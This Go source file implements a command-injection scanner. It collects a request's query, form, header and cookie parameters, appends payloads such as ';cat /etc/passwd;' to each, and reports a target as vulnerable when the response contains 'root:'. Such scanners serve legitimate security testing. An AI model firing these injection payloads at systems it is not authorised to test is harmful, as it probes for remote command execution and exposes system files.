package scanner

import (
	"io"
	"net/http"
	"strings"
)

type Scanner struct {
	testCommands []string
	client       *http.Client
}

type InjectionPoint struct {
	Type  string // "query", "header", "cookie", "form"
	Name  string
	Value string
}

func NewScanner() *Scanner {
	return &Scanner{
		testCommands: []string{
			";cat /etc/passwd;",
			"|cat /etc/passwd|",
			"`cat /etc/passwd`",
		},
		client: &http.Client{},
	}
}

func (s *Scanner) ScanRequest(req *http.Request) []InjectionPoint {
	var points []InjectionPoint

	if req.Method == http.MethodGet {
		for param, values := range req.URL.Query() {
			for _, value := range values {
				points = append(points, InjectionPoint{
					Type:  "query",
					Name:  param,
					Value: value,
				})
			}
		}
	}

	if req.Method == http.MethodPost {
		if err := req.ParseForm(); err == nil {
			for param, values := range req.PostForm {
				for _, value := range values {
					points = append(points, InjectionPoint{
						Type:  "form",
						Name:  param,
						Value: value,
					})
				}
			}
		}
	}

	for header, values := range req.Header {
		for _, value := range values {
			points = append(points, InjectionPoint{
				Type:  "header",
				Name:  header,
				Value: value,
			})
		}
	}

	for _, cookie := range req.Cookies() {
		points = append(points, InjectionPoint{
			Type:  "cookie",
			Name:  cookie.Name,
			Value: cookie.Value,
		})
	}

	return points
}

func (s *Scanner) TestInjection(point InjectionPoint, req *http.Request) (bool, error) {
	for _, cmd := range s.testCommands {
		modifiedReq := req.Clone(req.Context())
		if modifiedReq.PostForm != nil {
			updateBody(modifiedReq)
		}

		switch point.Type {
		case "query":
			q := modifiedReq.URL.Query()
			q.Set(point.Name, point.Value+cmd)
			modifiedReq.URL.RawQuery = q.Encode()

		case "form":
			if err := modifiedReq.ParseForm(); err == nil {
				modifiedReq.Form.Set(point.Name, point.Value+cmd)
				modifiedReq.PostForm = modifiedReq.Form
				updateBody(modifiedReq)
			}

		case "cookie":
			modifiedReq.Header.Set("Cookie", strings.Replace(
				modifiedReq.Header.Get("Cookie"),
				point.Value,
				point.Value+cmd,
				1))

		case "header":
			modifiedReq.Header.Set(point.Name, point.Value+cmd)
		}

		isVulnarable, err := s.isVulnerable(modifiedReq)

		if err != nil {
			return false, err
		}

		if isVulnarable {
			return true, nil
		}
	}
	return false, nil
}

func (s *Scanner) isVulnerable(req *http.Request) (bool, error) {
	resp, err := s.client.Do(req)
	if err != nil {
		return false, err
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return false, nil
	}

	return strings.Contains(string(body), "root:"), nil
}

func updateBody(req *http.Request) {
	body := req.PostForm.Encode()
	req.Body = io.NopCloser(strings.NewReader(body))
	req.ContentLength = int64(len(body))
}
